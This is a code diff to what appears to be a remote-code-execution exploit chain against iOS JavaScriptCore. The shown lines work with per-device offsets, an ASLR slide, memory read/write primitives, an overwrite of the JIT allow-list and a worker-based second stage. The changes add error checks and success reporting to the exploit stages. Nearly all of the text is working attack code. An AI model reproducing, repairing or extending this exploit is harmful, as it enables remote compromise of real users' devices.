@@ -3234,10 +3234,24 @@ const device_chipset = {
         print(`libsystem_pthread_base: ${libsystem_pthread_base.hex()}`);
         const libsystem_pthread_linkedit = read64(libsystem_pthread_base + 0x600n);
         print(`libsystem_pthread_linkedit: ${libsystem_pthread_linkedit.hex()}`);
-        device_model = linkedit_to_device[ios_version][libsystem_pthread_linkedit];
+        const linkedit_map = linkedit_to_device[ios_version];
+        if (!linkedit_map) {
+            print(`missing linkedit map for ios_version=${ios_version}`);
+            return false;
+        }
+        device_model = linkedit_map[libsystem_pthread_linkedit];
+        if (!device_model) {
+            print(`missing device model for ios_version=${ios_version} libsystem_pthread_linkedit=${libsystem_pthread_linkedit.hex()} known=${Object.keys(linkedit_map).join(",")}`);
+            return false;
+        }
         print("device_model: " + device_model);
         chipset = device_chipset[device_model];
-        offsets = { ...rce_offsets[device_model] };
+        const device_offsets = rce_offsets[device_model];
+        if (!device_offsets) {
+            print(`missing rce offsets for device_model=${device_model}`);
+            return false;
+        }
+        offsets = { ...device_offsets };
         slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
         print(`slide: ${slide.hex()}`);
         for (const key of Object.keys(offsets)) {
@@ -3245,7 +3259,8 @@ const device_chipset = {
         }
         write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
         write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
-        this.stage2();
+        if (!this.stage2())
+            return false;
         return true;
     }
 
@@ -3275,6 +3290,11 @@ const device_chipset = {
                 }
             }
 
+            if (!worker) {
+                print(`stage2 could not find DedicatedWorkerGlobalScope, contexts_length=${contexts_length}`);
+                return false;
+            }
+
             print(`worker: ${worker.hex()}`);
 
             const script = this.read64(worker + 0x150n);
@@ -3288,10 +3308,12 @@ const device_chipset = {
             const butterfly = this.read64(boxed_arr + 8n);
             this.write64(unboxed_arr + 8n, butterfly);
             print("Finished stage2 succesfully");
+            return true;
         }
         catch(e)
         {
             print("got error in stage2: " + e);
+            return false;
         }
     }
 
@@ -3477,8 +3499,9 @@ const device_chipset = {
                 print("Failed RCE");
                 return false;
             }
-            print("RCE success");
-            return this.stage1();
+            const stage1_ok = this.stage1();
+            print(stage1_ok ? "RCE success" : "RCE stage1/stage2 failed");
+            return stage1_ok;
         });
     }  
 }
